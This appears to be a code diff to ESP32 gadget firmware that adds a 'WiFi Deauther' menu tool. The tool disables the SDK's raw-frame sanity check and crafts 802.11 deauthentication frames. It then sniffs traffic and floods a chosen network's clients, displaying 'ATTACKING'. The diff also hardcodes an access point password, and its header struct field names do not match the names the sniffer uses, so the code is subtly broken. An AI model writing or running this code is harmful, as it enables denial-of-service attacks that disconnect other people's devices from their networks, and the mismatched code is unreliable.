@@ -66,6 +66,8 @@ enum AppState {
   STATE_SYSTEM_SUB_TOOLS,
   STATE_TOOL_SPAMMER,
   STATE_TOOL_DETECTOR,
+  STATE_DEAUTH_SELECT,
+  STATE_TOOL_DEAUTH,
   STATE_PIN_LOCK,
   STATE_CHANGE_PIN,
   STATE_SCREEN_SAVER,
@@ -460,6 +462,49 @@ void drawMatrix() {
   }
   display.display();
 }
+
+// --- DEAUTH DEFINITIONS ---
+typedef struct {
+  int16_t fctl;
+  int16_t duration;
+  uint8_t da[6];
+  uint8_t sa[6];
+  uint8_t bssid[6];
+  int16_t seqctl;
+} __attribute__((packed)) mac_hdr_t;
+
+typedef struct {
+  mac_hdr_t hdr;
+  uint8_t payload[];
+} wifi_packet_t;
+
+struct deauth_frame_t {
+  uint8_t frame_control[2];
+  uint8_t duration[2];
+  uint8_t station[6];
+  uint8_t sender[6];
+  uint8_t access_point[6];
+  uint8_t seq_ctl[2];
+  uint16_t reason;
+} __attribute__((packed));
+
+deauth_frame_t deauth_frame;
+int deauth_type = 0;
+int eliminated_stations = 0;
+#define DEAUTH_TYPE_SINGLE 0
+#define DEAUTH_TYPE_GLOBAL 1
+#define NUM_FRAMES_PER_DEAUTH 3
+#define DEAUTH_BLINK_TIMES 1
+#define DEAUTH_BLINK_DURATION 20
+#define AP_SSID "ESP32_Cloner"
+#define AP_PASS "password123"
+
+wifi_promiscuous_filter_t filt = {
+    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
+};
+
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { return 0; }
+esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 
 // --- SSID SPAMMER CONFIG ---
 const char* fakeSSIDs[] = {
@@ -980,6 +1025,162 @@ int videoCurrentFrame = 0;
 unsigned long lastVideoFrameTime = 0;
 const int videoFrameDelay = 70; // 25 FPS
 
+// ---------------- DEAUTH LOGIC ----------------
+void deauth_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
+  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
+  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
+  const mac_hdr_t *mac_header = &packet->hdr;
+
+  const int packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
+
+  if (packet_length < 0) return;
+
+  if (deauth_type == DEAUTH_TYPE_SINGLE) {
+    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
+      memcpy(deauth_frame.station, mac_header->src, 6);
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
+        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
+      eliminated_stations++;
+      ledQuickFlash();
+    } else return;
+  } else {
+    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
+      memcpy(deauth_frame.station, mac_header->src, 6);
+      memcpy(deauth_frame.access_point, mac_header->dest, 6);
+      memcpy(deauth_frame.sender, mac_header->dest, 6);
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
+        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
+    } else return;
+  }
+}
+
+void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
+  eliminated_stations = 0;
+  deauth_type = attack_type;
+  deauth_frame.reason = reason;
+
+  // Initialize deauth frame
+  deauth_frame.frame_control[0] = 0xC0;
+  deauth_frame.frame_control[1] = 0x00;
+  deauth_frame.duration[0] = 0x00;
+  deauth_frame.duration[1] = 0x00;
+  deauth_frame.seq_ctl[0] = 0x00;
+  deauth_frame.seq_ctl[1] = 0x00;
+
+  if (deauth_type == DEAUTH_TYPE_SINGLE) {
+    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
+    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
+    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
+  } else {
+    WiFi.softAPdisconnect();
+    WiFi.mode(WIFI_MODE_STA);
+  }
+
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_filter(&filt);
+  esp_wifi_set_promiscuous_rx_cb(&deauth_sniffer);
+}
+
+void stop_deauth() {
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+}
+
+void scanForDeauth() {
+    scanWiFiNetworks();
+    changeState(STATE_DEAUTH_SELECT);
+}
+
+void drawDeauthSelect(int x_offset) {
+  // Re-use WiFi display logic but change title
+  display.clearDisplay();
+  drawStatusBar();
+
+  display.setTextSize(1);
+  display.setCursor(x_offset + 5, 0);
+  display.print("SELECT TARGET");
+
+  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
+
+  if (networkCount == 0) {
+    display.setCursor(10, 25);
+    display.println("No networks found");
+  } else {
+    int startIdx = wifiPage * wifiPerPage;
+    int endIdx = min(networkCount, startIdx + wifiPerPage);
+
+    for (int i = startIdx; i < endIdx; i++) {
+      int y = 12 + (i - startIdx) * 12;
+
+      if (i == selectedNetwork) {
+        display.fillRect(0, y, SCREEN_WIDTH, 11, SSD1306_WHITE);
+        display.setTextColor(SSD1306_BLACK);
+      } else {
+        display.setTextColor(SSD1306_WHITE);
+      }
+
+      display.setCursor(2, y + 2);
+
+      String displaySSID = networks[i].ssid;
+      if (displaySSID.length() > 14) {
+        displaySSID = displaySSID.substring(0, 14) + "..";
+      }
+      display.print(displaySSID);
+
+      int bars = map(networks[i].rssi, -100, -50, 1, 4);
+      bars = constrain(bars, 1, 4);
+      display.setCursor(110, y + 2);
+      for (int b = 0; b < bars; b++) {
+        display.print("|");
+      }
+
+      display.setTextColor(SSD1306_WHITE);
+    }
+
+    if (networkCount > wifiPerPage) {
+      display.setCursor(45, 56);
+      display.print("Pg ");
+      display.print(wifiPage + 1);
+      display.print("/");
+      display.print((networkCount + wifiPerPage - 1) / wifiPerPage);
+    }
+  }
+
+  display.display();
+}
+
+void drawDeauthTool() {
+  display.clearDisplay();
+
+  if(random(0,10) == 0) display.invertDisplay(true);
+  else display.invertDisplay(false);
+
+  display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_WHITE);
+  display.setTextColor(SSD1306_BLACK);
+  display.setTextSize(1);
+  display.setCursor(25, 2);
+  display.print("WIFI DEAUTHER");
+
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 20);
+  display.print("Target: ");
+  String t = networks[selectedNetwork].ssid;
+  if (t.length() > 10) t = t.substring(0,10) + "..";
+  display.println(t);
+
+  display.setCursor(0, 35);
+  display.print("Packets: ");
+  display.print(eliminated_stations);
+
+  // Animation
+  if (millis() % 500 < 250) {
+      display.setCursor(80, 50);
+      display.print("ATTACKING");
+  }
+
+  display.display();
+}
+
 // ---------------- SSID SPAMMER LOGIC ----------------
 void sendBeacon(const char* ssid) {
   uint8_t randomMac[6];
@@ -1223,6 +1424,8 @@ void refreshCurrentScreen() {
     case STATE_CHAT_RESPONSE: displayResponse(); break;
     case STATE_TOOL_SPAMMER: drawSpammer(); break;
     case STATE_TOOL_DETECTOR: drawDetector(); break;
+    case STATE_DEAUTH_SELECT: drawDeauthSelect(x_offset); break;
+    case STATE_TOOL_DEAUTH: drawDeauthTool(); break;
     // Game states handle their own drawing, so no call here
     case STATE_GAME_SPACE_INVADERS:
     case STATE_GAME_SIDE_SCROLLER:
@@ -3809,10 +4012,11 @@ void showSystemToolsMenu(int x_offset) {
     "I2C Benchmark",
     "SSID Spammer",
     "Deauth Detect",
+    "WiFi Deauther",
     "Reboot System",
     "Back"
   };
-  drawGenericListMenu(x_offset, "TOOLS", ICON_SYS_TOOLS, items, 6, systemMenuSelection, &systemMenuScrollY);
+  drawGenericListMenu(x_offset, "TOOLS", ICON_SYS_TOOLS, items, 7, systemMenuSelection, &systemMenuScrollY);
 }
 
 void handleSystemMenuSelect() {
@@ -3880,6 +4084,9 @@ void handleSystemToolsMenuSelect() {
       changeState(STATE_TOOL_DETECTOR);
       break;
     case 4:
+      scanForDeauth();
+      break;
+    case 5:
       display.clearDisplay();
       display.setCursor(30, 30);
       display.print("Rebooting...");
@@ -3887,7 +4094,7 @@ void handleSystemToolsMenuSelect() {
       delay(500);
       ESP.restart();
       break;
-    case 5: changeState(STATE_SYSTEM_MENU); systemMenuSelection = 2; break;
+    case 6: changeState(STATE_SYSTEM_MENU); systemMenuSelection = 2; break;
   }
 }
 
@@ -4409,6 +4616,14 @@ void handleUp() {
     case STATE_SYSTEM_SUB_TOOLS:
       if (systemMenuSelection > 0) systemMenuSelection--;
       break;
+    case STATE_DEAUTH_SELECT:
+      if (selectedNetwork > 0) {
+        selectedNetwork--;
+        if (selectedNetwork < wifiPage * wifiPerPage) {
+          wifiPage--;
+        }
+      }
+      break;
     case STATE_API_SELECT:
       if (menuSelection > 0) {
         menuSelection--;
@@ -4491,7 +4706,15 @@ void handleDown() {
       if (systemMenuSelection < 6) systemMenuSelection++;
       break;
     case STATE_SYSTEM_SUB_TOOLS:
-      if (systemMenuSelection < 5) systemMenuSelection++;
+      if (systemMenuSelection < 6) systemMenuSelection++;
+      break;
+    case STATE_DEAUTH_SELECT:
+      if (selectedNetwork < networkCount - 1) {
+        selectedNetwork++;
+        if (selectedNetwork >= (wifiPage + 1) * wifiPerPage) {
+          wifiPage++;
+        }
+      }
       break;
     case STATE_API_SELECT:
       if (menuSelection < 1) {
@@ -4610,6 +4833,12 @@ void handleSelect() {
       break;
     case STATE_SYSTEM_SUB_TOOLS:
       handleSystemToolsMenuSelect();
+      break;
+    case STATE_DEAUTH_SELECT:
+      if (networkCount > 0) {
+        start_deauth(selectedNetwork, DEAUTH_TYPE_SINGLE, 1);
+        changeState(STATE_TOOL_DEAUTH);
+      }
       break;
     case STATE_SYSTEM_POWER:
       {
@@ -4800,6 +5029,13 @@ void handleBackButton() {
     case STATE_TOOL_DETECTOR:
       stopWifiTools();
       changeState(STATE_SYSTEM_SUB_TOOLS);
+      break;
+    case STATE_DEAUTH_SELECT:
+      changeState(STATE_SYSTEM_SUB_TOOLS);
+      break;
+    case STATE_TOOL_DEAUTH:
+      stop_deauth();
+      changeState(STATE_DEAUTH_SELECT);
       break;
 
     default:
